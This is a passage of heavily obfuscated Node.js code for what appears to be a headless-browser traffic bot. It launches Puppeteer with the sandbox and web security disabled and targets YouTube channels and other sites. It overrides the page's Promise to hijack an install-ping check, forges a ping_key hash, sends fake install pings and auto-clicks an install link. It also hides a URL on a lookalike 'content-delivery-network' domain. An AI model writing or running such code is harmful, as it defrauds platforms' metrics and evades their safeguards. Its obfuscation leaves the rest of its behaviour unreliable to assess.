                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x2 * 0x43a + -0x9c + 0x950 ? (this['block'] = P[0x1 * -0x559 + -0x1 * -0x2d2 + -0x3 * -0xdd], this['start'] = N - (-0x89a + 0x1d75 + -0x149b), this['hash'](), this['hashed'] = -0x24bf * 0x1 + 0x22c9 + 0x1f7 * 0x1) : this['start'] = N;
                }
                return this['bytes'] > 0x65ddf7 * -0x285 + -0x1 * 0x3da06318 + 0x23e48a26a && (this['hBytes'] += this['bytes'] / (0x4 * 0x54a47286 + -0x1104f306c + 0xb8b9 * 0x106f4) << -0x8 * 0x62 + -0x1f * -0x11b + -0x1f35, this['bytes'] = this['bytes'] % (-0x1f1fc540c + -0xd7156e * -0x3a + 0x2c1417920)), this;
              }
            }
            ['finalize']() {
              const Y = b;
              if (!this['finalized']) {
                this['finalized'] = -0x67c * 0x2 + 0x63b + -0x1 * -0x6be;
                var J = this['blocks'],
                  K = this['lastByteIn' + Y(0xd, 'b1Lr')];
                J[-0x2034 + -0x2030 + 0x4074] = this['block'], J[K >> 0x234a * -0x1 + -0x3 * -0xa81 + 0x3c9] |= x[0xeb4 + -0x835 * -0x1 + 0xb73 * -0x2 & K], this['block'] = J[-0x1ad * 0x3 + 0xba2 + -0x68b], K >= 0x2fe + 0x10fa + -0x13c0 && (this['hashed'] || this['hash'](), J[-0x213d + -0x13 * -0xc1 + 0x12ea] = this['block'], J[-0x1350 + 0x1 * 0x1a77 + 0x717 * -0x1] = J[0x6 * 0x375 + 0x27 * -0x99 + 0x292] = J[-0x10 * 0x14e + -0x10ea + -0xec * -0x29] = J[-0x1 * 0xe73 + 0x1607 + -0x791] = J[0x125f + 0x23c1 + 0x1b0e * -0x2] = J[-0xe * -0x73 + 0x2 * -0x1a3 + -0x2ff] = J[-0x2261 + 0x1273 * 0x2 + -0x27f] = J[0x5e1 + -0xb9 * 0xa + -0xb * -0x20] = J[0x2504 + 0x16fb + -0x3bf7] = J[0x1 * -0x1559 + -0x1 * 0x1093 + -0x3 * -0xca7] = J[-0x1f4c + 0x2 * -0xfc1 + -0x4 * -0xfb6] = J[-0x17f * -0xf + -0x3ee + -0x1278] = J[-0x12f1 * -0x1 + 0x12fe + -0x25e3] = J[0x1d * -0x10d + 0x7cd * -0x1 + 0x2653] = J[-0x33b + 0xd * 0x70 + -0x267] = J[0xbad * 0x1 + -0xd7a + 0x1dc] = -0x1 * -0xa7c + 0x5 * -0x2cb + 0x37b), J[0x1616 * 0x1 + -0x227 * -0xe + -0x342a] = this['hBytes'] << -0xfbd * 0x2 + -0xf2d * -0x2 + 0x123 | this['bytes'] >>> 0x61b + 0x1cb * -0xd + 0x1151, J[0x3f0 + 0x86d + 0x15 * -0x96] = this['bytes'] << -0xb2 * 0x28 + 0x2 * -0xad8 + 0xd * 0x3cf, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x1a47 + -0x1 * -0x1bd1 + -0x428 * 0xd; J < -0x3b3 + 0x1 * 0x1c1f + -0x181c; ++J)
                K = Q[J - (-0xce8 + 0x1 * 0x261f + -0x1934)] ^ Q[J - (-0x1a48 + 0x1 * -0x1157 + 0x2ba7)] ^ Q[J - (-0x67e * -0x1 + -0x16d3 * -0x1 + 0x9c1 * -0x3)] ^ Q[J - (-0x2f * -0x47 + 0x9af * -0x2 + -0x665 * -0x1)], Q[J] = K << 0x622 + -0xa * 0x25f + 0x283 * 0x7 | K >>> -0xc40 + 0x1d0e + 0x1 * -0x10af;
              for (J = 0x3f * -0x43 + -0x350 * -0xa + 0x10a3 * -0x1; J < 0x1b97 + -0x1e * -0x121 + -0x13 * 0x33b; J += 0x1fe0 + 0x767 + -0x2742)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x228 * 0x10 + -0x4d + -0x222e | L >>> -0x16 * 0x12a + -0xf27 + -0x146f * -0x2) + (M & N | ~M & O) + P + (0x62823c38 + 0x5b21c * 0x14b0 + -0x11f9c569 * 0x7) + Q[J] << -0x2540 + -0x1 * -0x821 + 0x1d1f) << -0x24a + -0xbe1 * 0x1 + 0xe30 | P >>> 0x14fd * 0x1 + 0x15c2 + -0xaa9 * 0x4) + (L & (M = M << 0x4a2 * 0x2 + -0x2 * -0x5db + -0x14dc | M >>> 0x1 * -0x1da7 + 0x1868 * -0x1 + 0x3611) | ~L & N) + O + (-0x1d3262 * -0x194 + -0x39891fb + -0x1 * -0x300788ec) + Q[J + (0x4d7 + -0x1e5a + 0x4 * 0x661)] << -0x1a1c + 0x3 * 0x935 + -0x183) << -0x1 * 0x1f3d + 0x15 * -0xd3 + -0x3091 * -0x1 | O >>> -0x685 + 0x4 * 0x7c4 + -0xb8 * 0x22) + (P & (L = L << 0x1ea7 + 0x5 * -0x5ca + -0x1 * 0x197 | L >>> 0x184d + 0x1b3 * -0xe + 0x1 * -0x81) | ~P & M) + N + (0x52f * 0x17b88d + -0x15 * 0x1024347 + -0x5d1 * 0x1efc7) + Q[J + (0x198d * -0x1 + -0x4a6 + 0x1e35)] << -0x1 * 0xfc9 + 0x4b5 * 0x8 + 0x1fd * -0xb) << 0x2 * -0xd62 + 0x12ec * -0x1 + -0x2db5 * -0x1 | N >>> 0x43b + 0xf6e + 0x2 * -0x9c7) + (O & (P = P << 0x2 * -0xb96 + 0xfe1 * -0x1 + 0x272b | P >>> 0x153a + 0x351 + 0x1 * -0x1889) | ~O & L) + M + (-0x1 * -0xb8fa876 + -0x3468f4b * 0x1 + 0x1071e016 * 0x5) + Q[J + (-0xba * 0xd + -0xa * 0x127 + -0x29 * -0x83)] << 0x1e19 + 0x9d7 + -0x27f0) << 0x1cdd + -0x211c + 0x444 | M >>> -0x1 * 0x1f9e + -0x1070 + 0x3029) + (N & (O = O << 0x169e + -0xc9 * -0x2f + -0x3b67 | O >>> 0x2c * 0x7b + 0x7 * 0x495 + -0x3535) | ~N & P) + L + (0x3c087446 * 0x2 + 0xb164ec95 + 0x518 * -0x28a0db) + Q[J + (-0xc20 + -0x17b0 + -0x1 * -0x23d4)] << 0x1 * -0x23a2 + -0x3f8 + 0x25 * 0x112, N = N << 0x2236 + -0x7 * 0x2d4 + -0xe4c | N >>> 0x1e32 + 0x1 * -0x1b46 + -0x2ea;
              for (; J < 0xa0f * -0x2 + 0x58f + 0xeb7; J += 0x216c + 0x15d8 * -0x1 + -0x1 * 0xb8f)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x21df + -0x11 * 0x11b + 0x1 * 0x34af | L >>> -0xd9a + 0xcd * 0x29 + -0xc * 0x198) + (M ^ N ^ O) + P + (0x19f8885b + -0x3630919d + 0x8b11f4e3 * 0x1) + Q[J] << 0xd53 * -0x1 + -0xb99 * -0x1 + 0x1ba) << 0x1428 + -0x19d + -0x1286 * 0x1 | P >>> 0x1376 + 0x85c + -0x1bb7) + (L ^ (M = M << 0x8 * 0xe6 + -0x1 * 0x20d6 + -0x184 * -0x11 | M >>> 0x11 * -0x1d7 + 0xc9c + 0x12ad * 0x1) ^ N) + O + (-0xaeebdcd5 + 0x2 * -0x3d6b6947 + 0x1989c9b04) + Q[J + (-0xd13 * -0x1 + -0x39 * -0x47 + -0x1ce1)] << 0x10bb + -0x1 * -0x38b + -0x1446) << 0x12d8 + 0x221a + -0x34ed | O >>> -0x169d + -0x11 * -0x1df + 0xb3 * -0xd) + (P ^ (L = L << -0x1dfc + -0x12b5 + 0x30cf | L >>> 0xb4c + 0x47 * 0x2f + -0x1853 * 0x1) ^ M) + N + (0x1f262739 + 0x105e2a4 * 0xb3 + -0x6769b444) + Q[J + (0xe55 + 0x1 * 0x311 + -0x2 * 0x8b2)] << -0x99 * -0x33 + 0x239 + -0x20b4) << -0xe * -0xdf + -0xa7 * 0x10 + -0x1bd | N >>> -0x1 * -0x19ee + 0x459 + 0x1 * -0x1e2c) + (O ^ (P = P << -0xbb4 + 0x2 * 0x101f + -0x146c * 0x1 | P >>> -0x243e + -0x1512 * 0x1 + 0x3952) ^ L) + M + (0x2 * -0x19c96f55 + 0x20d * 0x37806e + 0x309a68b5) + Q[J + (-0xf7e + 0x1cf9 * 0x1 + 0x6bc * -0x2)] << 0x1d0c + -0x9cb + -0x1341 * 0x1) << 0x26da + 0x148 * -0x16 + -0xaa5 * 0x1 | M >>> -0x10ef * -0x1 + -0x1ced + 0x13 * 0xa3) + (N ^ (O = O << -0x1 * -0x1ce5 + 0x2 * 0xc80 + 0xd * -0x423 | O >>> 0x4d * 0xb + 0x2a7 + -0x5f4) ^ P) + L + (-0x3c3a62b * -0x1f + 0x3e * 0x2d14f0e + -0x503 * 0x2405a8) + Q[J + (0x2 * 0xc33 + -0x1 * -0xd27 + 0xc83 * -0x3)] << -0x2554 + 0xa0b + 0x1b49, N = N << 0x22ba + 0xcb6 + -0x2f52 * 0x1 | N >>> -0x2d + -0xc65 + -0x46 * -0x2e;
              for (; J < -0x37f * 0x2 + 0x12b3 + -0xb79; J += -0xdef * -0x2 + 0x27 * -0x32 + 0x1 * -0x143b)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x20dc + -0x1 * -0x1c0e + -0x3ce5 | L >>> -0x1 * 0x1127 + -0x61 * -0x2 + 0x1080) + (M & N | M & O | N & O) + P - (-0x62c84cea + 0x2f3 * 0x30c04d + 0x43e56cf7) + Q[J] << -0xa27 + 0x108d + -0x666) << -0x1f9e + -0x2 * -0x920 + 0xd63 | P >>> 0x464 + 0x139e + -0x17e7) + (L & (M = M << -0x1 * -0x1c2d + -0x81a + -0x6a7 * 0x3 | M >>> 0x1 * 0x13f3 + -0x12dd + -0x114) | L & N | M & N) + O - (0x5412750d * 0x2 + 0x53a38782 * 0x1 + -0x8ae42e78) + Q[J + (-0x17cc + -0xcc6 + 0x2493)] << -0x2 * -0xb11 + -0x25 * 0xcf + 0x7c9) << 0x11ef + -0xe5e + -0x38c | O >>> 0x1ff7 + -0xb3 * -0x13 + -0x2d25 * 0x1) + (P & (L = L << -0x4 * -0xfb + -0x250a + 0x213c | L >>> -0x2051 + -0x53 * 0x5f + 0x3f20) | P & M | L & M) + N - (-0x6da6b499 + 0x93cf9ee * -0x7 + -0x1 * -0x11f35cd3f) + Q[J + (-0xfb5 + -0xf1 + 0x29 * 0x68)] << -0x2616 + 0x69d * -0x2 + 0x3350) << -0xe3 * 0xb + -0xf * 0x281 + -0x1 * -0x2f55 | N >>> -0x1eb * 0x13 + -0x302 + 0x278e) + (O & (P = P << -0x1979 + -0xab8 + 0x37 * 0xa9 | P >>> -0x1fff * 0x1 + -0x81 * -0x33 + 0x64e) | O & L | P & L) + M - (0x200b * 0x6b45b + -0xd7f69962 + 0x7205bc9d) + Q[J + (-0xeb * 0xb + 0x1970 + -0x3d5 * 0x4)] << -0x3 * -0x44d + -0xd * -0x2b4 + -0x1 * 0x300b) << 0x806 + -0xd33 + -0x13 * -0x46 | M >>> -0x102d * 0x1 + 0x840 + 0x4 * 0x202) + (N & (O = O << 0x2 * -0x124c + -0x24e + 0x4 * 0x9c1 | O >>> -0x935 * 0x2 + -0xf * 0xac + 0x1c80) | N & P | O & P) + L - (-0xb3af75ea + -0x1 * -0x712c8ddd + -0x5e13b * -0x1e83) + Q[J + (-0xb39 + -0xe * -0x18a + -0x179 * 0x7)] << 0x173c + -0x2431 + 0xcf5, N = N << -0x18cc + 0x407 * 0x3 + -0x9 * -0x16d | N >>> 0x5f4 * -0x3 + -0x1 * 0x851 + -0x1a2f * -0x1;
              for (; J < 0x2187 + -0x269 + -0x1 * 0x1ece; J += -0x1553 + -0x97 * 0x1 + -0x15ef * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x10f * -0x5 + -0x45f * -0x1 + 0x1 * 0xf1 | L >>> 0x1acf * 0x1 + 0x26fe + 0x3 * -0x15e6) + (M ^ N ^ O) + P - (-0x451c652a + 0x207d6681 + 0x5a3c3cd3) + Q[J] << -0x19fa + 0x1814 * -0x1 + -0x95 * -0x56) << -0x4 * -0x915 + -0x102a * 0x1 + 0x23d * -0x9 | P >>> -0xb2 * 0x2 + 0x314 * -0x1 + 0x493) + (L ^ (M = M << -0x10da + -0x1386 + 0x247e | M >>> -0x71 * -0x43 + -0x3 * -0x1d3 + -0x230a) ^ N) + O - (0x3d5c630f + -0x6ed3b19 + -0xd1e9cc) + Q[J + (0x4 * 0x68e + 0x2b * -0x99 + -0xb * 0xc)] << -0x6 * -0x4b0 + -0x36d * 0x5 + -0xaff) << -0x29 * -0x63 + -0x2338 + 0x1362 | O >>> -0x1aca + 0x1b * -0x63 + 0x2556) + (P ^ (L = L << 0xcf + -0x12f0 + 0x123f | L >>> -0x240c + -0x95 * 0x2b + 0x3d15) ^ M) + N - (-0x26cfa003 + 0x12b190eb + -0x83 * -0x901616) + Q[J + (0x80e * 0x3 + 0x9d * -0xb + 0x1 * -0x1169)] << -0x1 * 0x6ea + -0x2575 * 0x1 + 0x2c5f) << -0x1 * 0x509 + 0x29 * -0x17 + 0x8bd | N >>> 0x67f * 0x5 + 0x2189 + -0x41e9) + (O ^ (P = P << -0x15 * -0x1c + 0x1334 + -0x1562 | P >>> -0x10c0 + 0x1 * -0x53b + 0x15fd) ^ L) + M - (-0x3f7b * 0x14aeb + 0x2e4b3383 + 0x5960de90 * 0x1) + Q[J + (0x14a6 + 0x2 * 0x47d + 0x9df * -0x3)] << 0x2 * -0x10ad + -0x2fb + 0x2455) << 0xd87 + -0x301 + -0x1 * 0xa81 | M >>> -0x1 * -0x258b + 0x1b88 + 0x84 * -0x7e) + (N ^ (O = O << 0x35 * 0x22 + 0xe0 * 0x28 + -0x29ec | O >>> -0x2509 + -0x14a4 + 0x39af) ^ P) + L - (0x2710be * 0x251 + 0x1 * 0x9c37dd0 + -0x2 * 0x175203e2) + Q[J + (-0x226a + 0x25 * 0x10d + -0x473)] << 0x953 + 0x2166 + -0x2ab9, N = N << 0x46 * -0x2f + -0x21a3 + 0x2e9b | N >>> 0x1cf3 + -0x121f * 0x2 + 0x26f * 0x3;
              this['h0'] = this['h0'] + L << -0x1e0a + -0x93c + 0x2746, this['h1'] = this['h1'] + M << -0x260f * -0x1 + -0x2c * -0x6f + 0x3923 * -0x1, this['h2'] = this['h2'] + N << 0x209 * 0x11 + -0x8 * -0x2c2 + -0x38a9 * 0x1, this['h3'] = this['h3'] + O << -0x16ce + 0x3eb * -0x1 + -0x1 * -0x1ab9, this['h4'] = this['h4'] + P << -0xd * 0xd4 + -0x1e5 + 0x7 * 0x1cf;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x58e + 0x3 * -0x799 + -0x1 * -0x1c75 & -0x9f7 * -0x2 + 0x3bf * -0x2 + -0x1 * 0xc61] + w[J >> -0x11d2 * -0x2 + 0x1 * -0x81 + -0x230b * 0x1 & 0x107 * -0xe + -0x1 * -0xa7b + 0x3f6] + w[J >> 0x1c77 + 0x1 * 0x18b9 + -0x351c & 0x537 + -0x1b04 + -0x2 * -0xaee] + w[J >> 0x14bb + 0x22d9 + -0x3784 & -0x1 * -0xd05 + 0x1082 + -0x1d78] + w[J >> -0x1f * -0x109 + 0x1a9 + -0x21b4 & 0xb9a + -0x27b + -0x910 * 0x1] + w[J >> -0xaea + -0x1404 + 0x1ef6 & -0xe * 0x243 + 0x1439 * -0x1 + 0x33f2] + w[J >> -0x6f9 + -0xb84 + -0x3 * -0x62b & 0x56d * 0x2 + -0x1 * -0x577 + -0x821 * 0x2] + w[-0x13 * 0x1d4 + -0x1 * 0x779 + -0x874 * -0x5 & J] + w[K >> -0x19a8 + 0x1864 + 0x160 & 0xbd7 + 0x581 + -0x1149] + w[K >> 0x764 * 0x2 + -0x25e1 * -0x1 + -0x3491 & -0xa5a + -0x9aa * 0x1 + -0x1 * -0x1413] + w[K >> -0x17d * 0x19 + -0x1fc1 * -0x1 + -0xec * -0x6 & 0x1984 + 0x2f * -0x9e + 0x38d] + w[K >> 0xa * 0x2d + 0x96b + -0x239 * 0x5 & -0x1 * -0x56 + -0x1 * 0xc2d + 0xbe6] + w[K >> 0x285 + 0x2565 * 0x1 + -0x27de & -0x2152 + 0x20eb + 0x76] + w[K >> -0x1550 + 0x1bcb + -0x673 & 0x1856 * -0x1 + 0x196c + -0x107] + w[K >> 0x1ae2 + 0x42 * 0x11 + 0x8 * -0x3e8 & 0x67 * 0x47 + -0x1da * 0xf + -0xbc * 0x1] + w[-0x1156 * -0x1 + 0x4 * -0x5c0 + 0x5b9 & K] + w[L >> 0xa5b + -0x1f7 + -0xd4 * 0xa & 0x219b + -0x1a7 + -0x1fe5] + w[L >> 0x250f + 0x1b53 + 0x3 * -0x156e & -0xb4d * -0x2 + -0x10c8 + 0x3b * -0x19] + w[L >> -0x1b36 + 0x1203 * 0x1 + -0x7d * -0x13 & -0x74a + 0x12e2 + -0x1 * 0xb89] + w[L >> -0x36e + -0x1 * -0x763 + -0x3e5 & 0x10f * 0x1d + 0x1a97 * 0x1 + -0x393b] + w[L >> -0xea1 + -0xb39 * 0x2 + 0x251f & -0xf13 + -0x5 * 0x43e + -0x8 * -0x48b] + w[L >> 0x7 * 0x179 + 0x26c4 + 0x1b * -0x1d1 & -0xa93 + -0x83f * -0x1 + 0x263] + w[L >> -0xe8 + 0x1b1d * 0x1 + 0x1a31 * -0x1 & 0x1a48 + 0x12 * 0x9c + -0x2531] + w[0x1 * 0xc81 + 0x4e7 * -0x2 + -0x2a4 & L] + w[M >> 0x1181 + -0x10cd * 0x1 + -0x98 & 0x1 * 0x1d77 + -0x26ca + 0x962] + w[M >> -0x11a + 0x919 * 0x4 + -0x2332 & 0x4fe + -0x4f * -0x6d + 0x2692 * -0x1] + w[M >> -0x2236 + -0x694 + 0x28de & 0x300 + -0x1460 + 0x116f] + w[M >> 0x18f0 + -0x1 * -0xbb6 + -0x2496 & 0x1a5 * -0x17 + 0x3 * 0x1ba + 0x256 * 0xe] + w[M >> -0x21eb + -0x3d * 0x79 + 0x3ecc & 0x25c4 * -0x1 + 0xc9a + 0x1939] + w[M >> -0x223c + 0x1cb8 + 0x58c & -0xf30 + -0x12 * 0x1c9 + 0x2f61] + w[M >> 0x266e + -0xa * -0x2de + -0x4316 & 0xdf8 + 0x517 * 0x5 + 0x394 * -0xb] + w[0x1 * 0x22a8 + -0x373 + -0x1f26 & M] + w[N >> -0x2507 + -0x12e * -0x10 + 0x55 * 0x37 & -0xb5e * 0x2 + 0x1 * -0xf98 + 0x1 * 0x2663] + w[N >> -0x2214 + 0x26a4 + 0x478 * -0x1 & 0x4 * 0x34b + 0x211b + 0x1ed * -0x18] + w[N >> 0xa7 * 0x20 + 0x2 * 0x355 + -0x1b76 & -0x13f * -0x17 + -0x247f * 0x1 + 0x1 * 0x7e5] + w[N >> 0x1570 + -0x32 * 0xb2 + 0xd64 & 0x17b * 0x13 + 0x1fc9 + -0x3bdb] + w[N >> 0x20aa + 0x1342 + -0x33e0 & -0xb1a + -0x25f9 + 0x13 * 0x296] + w[N >> -0x245b + -0x1b11 + -0x1fba * -0x2 & -0x67 * -0x59 + 0x1f03 + -0x42c3] + w[N >> 0x5ab * 0x4 + -0x11 * -0xdb + -0x2533 & -0x574 + 0x2495 + -0x1f12] + w[-0x260a + -0x2 * 0xc67 + -0x1 * -0x3ee7 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x1 * 0xad2 + 0x1bce * -0x1 + -0x1114 * -0x1 & -0x13d3 + -0x1d * -0x10b + -0x96d * 0x1,
                J >> -0x18f9 + -0x1e7 * 0x3 + 0x1ebe & 0x13e6 + -0x9 * 0x2e5 + -0x3d * -0x1e,
                J >> 0xe35 + 0x13 * -0x1f2 + 0x16c9 & 0x2454 + -0x2fe + -0x2057,
                -0xd48 + -0x1 * -0x1d55 + -0xf0e & J,
                K >> 0x13f7 + -0x43 * 0x2f + -0x792 & 0x1482 + 0x1876 + -0x2bf9,
                K >> -0xb * -0x139 + 0xd54 * -0x1 + -0xf * 0x1 & 0x250d + -0x1d * -0x1d + -0x2757,
                K >> -0x2 * -0x12ec + -0x1c6b + 0x965 * -0x1 & 0x37 + 0x3 * 0xc0e + -0x2362,
                0x4 * -0x71b + 0x1858 + 0x1b1 * 0x3 & K,
                L >> -0x25be + -0x23 * 0x97 + 0x1 * 0x3a7b & 0x359 + 0x1411 + -0x1 * 0x166b,
                L >> 0x254c + -0x17 * 0x11c + -0xc * 0xfa & -0x2130 + 0x12f + 0x2100,
                L >> -0x6 * 0x8b + -0x1b33 + 0x1e7d & -0x23f3 * 0x1 + 0x126b + 0x1287,
                0xf6f + -0xa18 + 0x458 * -0x1 & L,
                M >> 0x9 * 0x53 + -0x46c * -0x7 + -0x21c7 & 0x3 * -0x7b5 + 0x1bb7 * -0x1 + 0x33d5,
                M >> -0x5 * 0x466 + -0x4f0 + -0xa * -0x2b3 & 0x2569 + 0x4 * 0x783 + 0x213b * -0x2,
                M >> -0x43 * 0x20 + -0x771 + -0x1 * -0xfd9 & 0x513 * -0x4 + -0x2358 + 0x3 * 0x12e1,
                0x93e + 0xc5f * -0x1 + -0x8 * -0x84 & M,
                N >> 0x1 * -0x2164 + -0x94 * -0x2f + -0x10 * -0x65 & -0xf37 + -0x245f + 0x3 * 0x1187,
                N >> 0x1b59 * 0x1 + -0x1e20 + 0x2d7 & -0xa76 + 0xa30 + -0xd * -0x19,
                N >> -0x14c7 + -0x1 * 0x15cb + 0x2a9a & -0x7 * -0x128 + 0x12e * 0x17 + -0x223b,
                0x9e * -0x2e + 0x2 * -0xc79 + 0x7 * 0x7c3 & N
              ];
            }
            [Z(0x22) + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x6a * -0x5e + -0x1940 + 0x4040 * 0x1), (K = new DataView(J))['setUint32'](-0x1 * 0x13f4 + -0x2e * -0x4a + 0x6a8, this['h0']), K['setUint32'](-0xff6 + -0xb08 * 0x1 + 0x1b02 * 0x1, this['h1']), K['setUint32'](-0x5 * -0x4c5 + -0xb8c + -0x1 * 0xc45, this['h2']), K['setUint32'](0x1c73 + -0x34 * -0x30 + -0x2627, this['h3']), K['setUint32'](-0x260a + -0xe47 + -0x3461 * -0x1, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0xb * -0x23d + 0xcf + 0x17d0];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x4c * -0x1d + -0x3ba + -0x4e2;
            J[-0xec6 + 0x656 * 0x5 + -0x10e8]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x10ca + -0x7a4 + 0x186e] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x1e6b + 0x1cb0 + -0x3b1a), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x2408 + -0x1c2 * -0x8 + -0x1 * 0x3217;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x5d8 + 0x174 * -0x9 + 0xd18), Promise['resolve'](0x1 * -0x1e0b + 0xf2b + 0xee1);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1cdc + -0xcb9 + 0x2995 * 0x1; j < -0x3 * 0x61 + -0x21aa + 0x22ce; j++)
    i();
}
const NETWORK_PATIENCE = 0x655 * -0x1 + -0x3 * 0xebe + 0x51cf + (-0x1e5 * -0xb + 0x4 * 0x699 + -0x1 * 0x2383) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x202f + 0x232c * -0x1 + 0x435e * 0x1) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + a0(0xf) + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';

function a() {
  const bp = [
    'kmkEW4nrW7VdG8oTkSktW6e',
    'yxbLx19MAwXS',
    'i2DVDhrLBwv6zq',
    'Dg8TyNvPBgqTyq',
    'D2HHDg5VDc1Kzq',
    'h8kCW7hcLq9EW4RcOSoFW6m',
    'C0VcVNfEnvP9pZG',
    'zM9YlxLVDxr1yG',
    'https://gr',
    'lwfYCMfZlwLVlq',
    '-warinspac',
    'none',
    'xxLEW7xdN8k7W7e',
    'WOPrWOu',
    'mc4WlJaGu2fMyq',
    'CMSUz2XPDgnOlG',
    'sByClassNa',
    'Play',
    'ErLXW7pdO8owEmoIWQxcTq',
    'w.theguard',
    'WOiZrmkucSoLjeGmWOS',
    'DbLHW6hdOmoljSoKW6tcTq',
    'W6JdP8oXnfvBaX3dGfu',
    'vejjsg',
    'CMCVzw4VC2nYAq',
    'RBSHAH4iWU',
    'WQNdMmoAW6hcOCkre8kIW4NdSG',
    'WRddSNi4W6FcMmk4vb3cSG',
    'bMmAquW',
    'easyfork.o',
    'Ahr0Chm6lY9NCG',
    'ike\x20Gecko)',
    'h8kCW5hcNXntW7dcOSofW5y',
    'WPHTnCkUW6LgWRZcS8onsG',
    'arrayBuffe'
  ];
  a = function() {
    return bp;
  };
  return a();
}
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + a1(0x17)
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x10 + 0x3b2 + -0x136 * 0x3; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1c91 + -0x1d * 0xeb + -0x373 * -0x10);
    let h = e[f];
    return h;
  }, d(b, c);
}
